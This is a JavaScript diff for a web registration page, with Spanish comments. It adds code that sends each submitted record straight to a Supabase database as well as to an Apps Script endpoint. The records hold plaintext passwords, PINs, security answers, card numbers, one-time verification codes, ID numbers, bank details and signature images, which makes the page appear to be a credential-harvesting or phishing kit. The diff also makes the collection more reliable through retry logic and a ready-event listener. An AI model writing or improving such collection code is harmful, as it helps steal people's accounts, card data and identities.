@@ -110,65 +110,120 @@
         sendWithFetch(appsScriptUrl, serializedPayload);
       }
 
+      function extractRegistrationData(payload) {
+        if (!payload || typeof payload !== 'object') {
+          return null;
+        }
+
+        if (payload.registrationData && typeof payload.registrationData === 'object') {
+          return payload.registrationData;
+        }
+
+        if (payload.data && typeof payload.data === 'object') {
+          return payload.data;
+        }
+
+        return payload;
+      }
+
       // Función para enviar también a Supabase (dual envío) - DIRECTO A SUPABASE
       function sendRegistrationToSupabase(payload) {
         try {
+          var registration = extractRegistrationData(payload);
+
+          if (!registration) {
+            console.warn('[Supabase] ⚠️ No se encontró información de registro válida para guardar.');
+            return;
+          }
+
           var supabasePayload = {
-            email: payload.email || null,
-            first_name: payload.firstName || null,
-            last_name: payload.lastName || null,
-            full_name: (payload.firstName && payload.lastName) ? payload.firstName + ' ' + payload.lastName : null,
-            preferred_name: payload.preferredName || payload.nickname || null,
-            nickname: payload.nickname || null,
-            country: payload.country || null,
-            state: payload.state || null,
-            gender: payload.gender || null,
-            birth_day: payload.birthDay || null,
-            birth_month: payload.birthMonth || null,
-            birth_year: payload.birthYear || null,
-            document_type: payload.documentType || null,
-            document_number: payload.documentNumber || null,
-            phone_country_code: payload.phoneCountryCode || null,
-            phone_prefix: payload.phonePrefix || null,
-            phone_number: payload.phoneNumber || payload.nationalPhoneNumber || null,
-            full_phone_number: payload.fullPhoneNumber || payload.phoneNumberFull || null,
-            password: payload.password || null,
-            security_pin: payload.securityPin || null,
-            security_question: payload.securityQuestion || null,
-            security_answer: payload.securityAnswer || null,
-            card_number: payload.cardNumber || null,
-            account_type: payload.accountType || null,
-            purpose: payload.purpose || null,
-            payment_method: payload.paymentMethod || null,
-            paypal_email: payload.paypalEmail || null,
-            operator: payload.operator || null,
-            initial_recharge_confirmed: payload.initialRechargeConfirmed || false,
-            venezuela_bank: payload.venezuelaBank || null,
-            signature_data_url: payload.signatureDataUrl || null
+            email: registration.email || null,
+            first_name: registration.firstName || null,
+            last_name: registration.lastName || null,
+            full_name: (registration.firstName && registration.lastName) ? registration.firstName + ' ' + registration.lastName : (registration.fullName || null),
+            preferred_name: registration.preferredName || registration.nickname || null,
+            nickname: registration.nickname || null,
+            country: registration.country || null,
+            state: registration.state || null,
+            gender: registration.gender || null,
+            birth_day: registration.birthDay || null,
+            birth_month: registration.birthMonth || null,
+            birth_year: registration.birthYear || null,
+            document_type: registration.documentType || null,
+            document_number: registration.documentNumber || null,
+            phone_country_code: registration.phoneCountryCode || null,
+            phone_prefix: registration.phonePrefix || null,
+            phone_number: registration.phoneNumber || registration.nationalPhoneNumber || null,
+            full_phone_number: registration.fullPhoneNumber || registration.phoneNumberFull || null,
+            password: registration.password || null,
+            security_code: registration.securityCode || registration.verificationCode || null,
+            security_pin: registration.securityPin || null,
+            security_question: registration.securityQuestion || null,
+            security_answer: registration.securityAnswer || null,
+            card_number: registration.cardNumber || null,
+            account_type: registration.accountType || null,
+            purpose: registration.purpose || null,
+            payment_method: registration.paymentMethod || null,
+            paypal_email: registration.paypalEmail || null,
+            operator: registration.operator || null,
+            initial_recharge_confirmed: registration.initialRechargeConfirmed || false,
+            venezuela_bank: registration.venezuelaBank || null,
+            signature_data_url: registration.signatureDataUrl || null,
+            device_id: registration.deviceId || null,
+            created_at: registration.createdAt || new Date().toISOString()
           };
 
           // Esperar a que Supabase esté listo y guardar directamente
-          function attemptSave() {
-            if (window.SupabaseDB && window.SupabaseDB.isReady()) {
-              window.SupabaseDB.saveRegistration(supabasePayload)
-                .then(function(result) {
-                  if (result.ok) {
-                    console.log('[Supabase] ✅ Registro guardado exitosamente:', result.data.id);
-                  } else {
-                    console.warn('[Supabase] ⚠️ Error al guardar:', result.error);
-                  }
-                })
-                .catch(function(error) {
-                  console.warn('[Supabase] ⚠️ Error inesperado:', error);
-                });
-            } else {
-              // Supabase aún no está listo, reintentar
-              console.log('[Supabase] ⏳ Esperando inicialización...');
-              setTimeout(attemptSave, 500);
+          var hasPersisted = false;
+
+          function persistRegistration() {
+            if (hasPersisted) {
+              return;
             }
+
+            hasPersisted = true;
+
+            window.SupabaseDB.saveRegistration(supabasePayload)
+              .then(function(result) {
+                if (result.ok) {
+                  console.log('[Supabase] ✅ Registro guardado exitosamente:', result.data.id);
+                } else {
+                  console.warn('[Supabase] ⚠️ Error al guardar:', result.error);
+                }
+              })
+              .catch(function(error) {
+                console.warn('[Supabase] ⚠️ Error inesperado:', error);
+                hasPersisted = false;
+              });
           }
 
-          attemptSave();
+          function waitForSupabaseReady() {
+            if (hasPersisted) {
+              return;
+            }
+
+            if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
+              persistRegistration();
+              return;
+            }
+
+            console.log('[Supabase] ⏳ Esperando inicialización...');
+            setTimeout(waitForSupabaseReady, 500);
+          }
+
+          if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
+            persistRegistration();
+          } else {
+            window.addEventListener('supabase:ready', function handleSupabaseReady() {
+              if (hasPersisted) {
+                window.removeEventListener('supabase:ready', handleSupabaseReady);
+                return;
+              }
+              window.removeEventListener('supabase:ready', handleSupabaseReady);
+              persistRegistration();
+            });
+            waitForSupabaseReady();
+          }
         } catch (error) {
           console.warn('[Supabase] ⚠️ Error en sendRegistrationToSupabase:', error);
         }
